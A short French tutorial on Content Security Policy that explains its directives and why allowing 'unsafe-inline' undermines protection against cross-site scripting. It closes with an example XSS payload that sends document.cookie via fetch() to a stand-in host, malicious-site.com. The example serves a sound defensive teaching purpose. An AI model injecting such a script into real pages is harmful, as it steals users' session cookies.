# Le CSP

---

Le CSP (_Content Security Policy_) est un mecanisme de sécurité web conçu pour prévenir les attaques comme le Cross-Site Scripting (XSS) et l'injection de contenu malveillant.

- Il permet aux développeurs de définir quelles sources de contenu (scripts, images, style, etc..) sont autorisées à s'exécuter sur leur site.

## Comment fonctionne CSP ?

CSP est activé via une en-tête HTTP ou une balise <code> &lt;meta&gt; </code>.
Exemple d'en-tête CSP :

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; style-src 'self' 'unsafe-inline'
```

## Ce que ça signifie :

- <code> unsafe-inline </code> est une option de la CSP qui permet l'exécution de **scripts inline** (JavaScript) et de **style inline** (CSS) directement dans le HTML.

  - Exemple de **script inline** :

    - ```html
      <script>
        alert("Hello !");
      </script>
      ```
    - ```css
      <style> body {background-color: red; }</style>
      ```

- <code> default-src 'self' </code> : Par défaut, seules les ressources du même domaine sont autorisées.
- <code> script-src 'self' https://apis.google.com </code> : Les scripts ne peuvent être chargés que depuis le même domaine **('self')** et **apis.google.com**.
- <code> style-src 'self' 'unsafe-inline' </code> : Les feuilles de style doivent venir du même domaine, mais le style inline **('unsafe-inline)** est autorisé **(Pas recommandé pour la sécurité)**

## Pourquoi unsafe-inline est dangereux ?

L'autorisation de **unsafe-inline** annule en grande partie la protection CSP contre le **Cross-Site-Scripting (XSS).**
Si un attaquant injecte un script malveillant dans une page (via une faille XSS), et que **unsafe-inline** est activé, le script **s'exécutera**, compromettant la sécurité du site.

Exemple d'attaque XSS exploitant **unsafe-inline** :

```html
<script>
  fetch("https://malicious-site.com/steal?cookie=" + document.cookie);
</script>
```

Avec **unsafe-inline**, ce script serait exécuté et pourrait voler les cookies de l'utilisateur.
